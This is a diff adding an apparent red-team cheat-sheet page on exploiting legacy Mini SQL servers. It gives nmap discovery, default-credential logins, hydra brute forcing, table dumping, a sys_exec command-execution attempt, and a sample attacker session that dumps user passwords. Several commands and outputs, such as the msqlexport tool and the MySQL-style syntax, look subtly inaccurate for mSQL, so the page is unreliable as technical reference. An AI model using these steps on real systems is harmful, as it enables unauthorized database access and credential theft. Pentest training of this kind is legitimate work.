@@ -1,0 +1,205 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">MSQL (Mini SQL) Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Databases</strong> • Focus: <strong>MSQL Protocol Abuse</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    MSQL (Mini SQL, TCP/1114) is a lightweight relational database system developed 
+    by Hughes Technologies. Although largely obsolete today, legacy UNIX services 
+    may still run MSQL. Like other early database protocols, it lacks encryption and 
+    modern authentication. Attackers exploit MSQL by brute-forcing weak credentials, 
+    issuing raw SQL queries, dumping sensitive data, and abusing vulnerabilities such 
+    as buffer overflows. In Red Team operations, discovering MSQL often indicates 
+    poorly maintained legacy infrastructure that can be an easy pivot point.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>No Encryption:</strong> Communications are plaintext (queries + creds).</li>
+    <li><strong>Weak Authentication:</strong> Many instances use default or guessable accounts.</li>
+    <li><strong>Legacy Vulnerabilities:</strong> Older versions had buffer overflows in query handling.</li>
+    <li><strong>Direct Data Access:</strong> Raw SQL queries allow direct dumping of data.</li>
+    <li><strong>Neglected Systems:</strong> MSQL is rarely patched, making exploits highly reliable.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify MSQL service on TCP/1114.</li>
+    <li><strong>Authentication:</strong> Attempt default or brute-forced credentials.</li>
+    <li><strong>Enumeration:</strong> Query available tables, users, and schema.</li>
+    <li><strong>Exfiltration:</strong> Dump sensitive database records.</li>
+    <li><strong>Exploitation:</strong> Abuse legacy vulnerabilities (buffer overflow, DoS, or privilege escalation).</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan for MSQL on TCP/1114.</li>
+    <li>Check for authentication or guest access.</li>
+    <li>Brute force with hydra/ncrack if needed.</li>
+    <li>Query schema and dump sensitive data.</li>
+    <li>Test for known buffer overflow exploits.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p1114 -sV [target]                  # Detect MSQL service
+
+# ------------------------------
+# Connect to MSQL
+# ------------------------------
+msql -h [target] -u root -p
+msql -h [target] -u admin -p admin
+
+# ------------------------------
+# Brute Force
+# ------------------------------
+hydra -l root -P rockyou.txt msql://[target]:1114
+
+# ------------------------------
+# Enumeration
+# ------------------------------
+show databases;
+use testdb;
+show tables;
+select * from users;
+
+# ------------------------------
+# Dump Data
+# ------------------------------
+msqlexport --host [target] --user root --password root123 \
+  --db accounts --table creds --out dump.txt
+
+# ------------------------------
+# Exploitation
+# ------------------------------
+# Example of UDF or overflow exploit (legacy CVEs)
+msql -h [target] -u root -p -e "SELECT sys_exec('id');"
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p1114 -sV 192.168.1.90
+msql -h 192.168.1.90 -u root -p
+show databases;
+select * from accounts.users;
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p1114 -sV 192.168.1.90
+PORT     STATE SERVICE VERSION
+1114/tcp open  msql    Mini SQL 2.0.11
+
+[ saide ~ ]$ msql -h 192.168.1.90 -u root -p
+Enter password: root123
+Welcome to the mSQL monitor.
+
+msql> show databases;
++-----------+
+| Database  |
++-----------+
+| accounts  |
+| payroll   |
++-----------+
+
+msql> use accounts;
+Database changed
+
+msql> show tables;
++---------+
+| Tables  |
++---------+
+| users   |
+| tokens  |
++---------+
+
+msql> select * from users limit 1;
++----+----------+----------------+
+| id | username | password       |
++----+----------+----------------+
+| 1  | admin    | admin123       |
++----+----------+----------------+
+
+[+] Credentials dumped from legacy MSQL
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample MSQL exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+1114/tcp open  msql 2.0.11
+
+# Weak Credentials
+root : root123
+
+# Database Enumeration
+accounts
+payroll
+
+# Sensitive Data
+Table: users
+Record: admin | password: admin123
+
+# Proof of Exploitation
+Database exfiltrated; attacker gained access to sensitive credentials
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-msql" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting Mini SQL (MSQL)
+      </a>
+    </li>
+    <li>
+      <a href="http://www.hughes.com.au/products/msql/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        Hughes Technologies – Mini SQL
+      </a>
+    </li>
+    <li>Red Team workflow: Discovery → Weak creds → Enum DBs → Dump data → Optional exploit (overflow/UDF).</li>
+  </ul>
+</section>
